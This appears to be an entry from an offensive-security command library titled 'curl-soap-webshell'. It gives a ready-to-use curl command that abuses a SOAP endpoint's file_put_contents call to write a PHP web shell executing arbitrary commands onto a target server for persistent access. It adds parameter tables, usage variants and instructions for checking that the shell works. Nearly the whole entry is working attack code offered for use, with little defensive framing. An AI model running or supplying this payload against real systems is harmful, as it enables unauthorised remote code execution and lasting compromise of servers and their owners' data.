---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: >-
  curl -X POST $1 -H "Content-Type: text/xml" -d '<?xml
  version="1.0"?><soap:Envelope
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><functionCall><name>file_put_contents</name><args><arg>$2</arg><arg>$3</arg></args></functionCall></soap:Body></soap:Envelope>'
  -i
tags:
  - rce
  - persistence
  - soap
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:19.496Z'
verified: false
validated: true
submitted: true
---
# curl-soap-webshell

## Command

```bash
curl -X POST http://target.com/soap -H "Content-Type: text/xml" -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><functionCall><name>file_put_contents</name><args><arg>/var/www/shell.php</arg><arg><?php system($_GET['cmd']); ?></arg></args></functionCall></soap:Body></soap:Envelope>' -i
```

## Description

Uses the RCE to write a PHP webshell via file_put_contents, providing persistent access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (positional $1) | Target SOAP endpoint | Yes |
| File path (positional $2) | Path for webshell (e.g., /var/www/shell.php) | Yes |
| Content (positional $3) | Webshell code | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://example.com/soap -H "Content-Type: text/xml" -d '<payload-with-shell>' -i
```

### Advanced Usage

```bash
curl -X POST http://target.com/soap -H "Content-Type: text/xml" -d '<encoded-payload>' --data-urlencode
```

## Expected Output

SOAP response confirming write (or empty on success); verify by accessing the shell URL.

## Related

- [[Related Procedure: Exploit PHP SOAP Type Confusion RCE]]
